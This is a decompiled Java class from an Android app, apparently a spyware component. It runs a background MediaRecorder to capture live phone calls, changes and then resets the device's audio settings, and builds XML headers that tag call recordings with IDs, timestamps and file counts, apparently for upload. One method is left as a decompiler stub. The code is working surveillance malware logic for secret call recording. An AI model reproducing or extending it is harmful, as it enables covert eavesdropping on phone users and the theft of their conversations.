package com.network.media;

import android.content.Context;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Xml;
import com.network.android.SmsReceiver;
import com.network.android.c.a.a;
import com.network.b.b;
import java.io.StringWriter;
import org.xmlpull.v1.XmlSerializer;

public final class r {

    /* renamed from: a  reason: collision with root package name */
    private static int f171a;
    private static int b = 0;
    private static MediaRecorder c;
    private static Handler d;

    static {
        HandlerThread handlerThread = new HandlerThread("Recorder record");
        handlerThread.start();
        d = new Handler(handlerThread.getLooper());
    }

    public static String a() {
        return b.c + b;
    }

    public static String a(int i, byte[] bArr, String str, String str2, int i2, int i3, String str3) {
        try {
            a.a("Recorder buildRecordFileHeader start");
            a.a("Recorder buildRecordFileHeader totalFiles: " + i3 + " fileNum: " + i2);
            XmlSerializer newSerializer = Xml.newSerializer();
            StringWriter stringWriter = new StringWriter();
            SmsReceiver.a(newSerializer, stringWriter);
            newSerializer.startTag("", "liveCallRecordList");
            newSerializer.startTag("", "liveCall");
            newSerializer.attribute("", "file", str2);
            newSerializer.attribute("", "phoneCallRecordId", str3);
            newSerializer.attribute("", "fileNum", new Integer(i2).toString());
            newSerializer.attribute("", "totalFiles", new Integer(i3).toString());
            newSerializer.attribute("", "contentType", "audio/amr");
            newSerializer.attribute("", "length", String.valueOf(bArr.length));
            if (1 == i) {
                newSerializer.attribute("", "isCompressed", "true");
            } else {
                newSerializer.attribute("", "isCompressed", "false");
            }
            newSerializer.attribute("", "originalFilename", str2);
            newSerializer.attribute("", "type", "liveCall");
            newSerializer.attribute("", "timestamp", str);
            newSerializer.attribute("", "originalTimestamp", str);
            newSerializer.endTag("", "liveCall");
            newSerializer.endTag("", "liveCallRecordList");
            SmsReceiver.a(newSerializer);
            a.a("Recorder buildRecordFileHeader sendAudio end");
            return stringWriter.toString();
        } catch (Throwable th) {
            a.a("Recorder buildRecordFileHeader exception: " + th.getMessage(), th);
            return null;
        }
    }

    public static void a(Context context) {
        try {
            a.a("Recorder record start");
            c = new MediaRecorder();
            d.post(new s((AudioManager) context.getSystemService("audio"), context));
        } catch (Exception e) {
            a.a("Recorder record " + e.getMessage(), e);
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:12:0x0042  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static void a(java.lang.String r5, java.lang.String r6) {
        /*
        // Method dump skipped, instructions count: 169
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.media.r.a(java.lang.String, java.lang.String):void");
    }

    public static MediaRecorder b() {
        return c;
    }

    public static void b(Context context) {
        try {
            if (c != null) {
                a.a("Recorder stopRecording start");
                c.stop();
                c.reset();
                c.release();
                c(context);
                c = null;
                a.a("Recorder stopRecording end");
                c = null;
            }
        } catch (Throwable th) {
            a.a("Recorder stopRecording disconect LOG_CALL_RECORDING_FAILED" + th.getMessage(), th);
            com.network.android.c.a.b.a(1, (short) 2011);
            c(context);
        }
    }

    static /* synthetic */ int c() {
        int i = b;
        b = i + 1;
        return i;
    }

    private static void c(Context context) {
        try {
            a.a("Recorder roleBackRecorderAudioSettings start");
            AudioManager audioManager = (AudioManager) context.getSystemService("audio");
            a.a("Recorder roleBackRecorderAudioSettings audioManagerMode: " + f171a);
            audioManager.setMode(0);
            audioManager.setStreamSolo(0, false);
            a.a("Recorder roleBackRecorderAudioSettings end");
        } catch (Throwable th) {
            a.a("Recorder roleBackRecorderAudioSettings " + th.getMessage(), th);
        }
    }
}
